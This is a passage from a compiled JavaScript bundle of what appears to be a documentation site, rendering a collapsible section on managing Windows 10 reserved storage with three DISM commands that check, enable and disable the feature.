details"},[t("summary",[s._v("Windows10预留保留空间管理")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("DISM.exe /Online /Get-ReservedStorageState\nDISM.exe /Online /Set-ReservedStorageState /State:Enabled\nDISM.exe /Online /Set-ReservedStorageState /State:Disabled\n")])])])])])}),[],!1,null,null,null);t.default=n.exports}}]);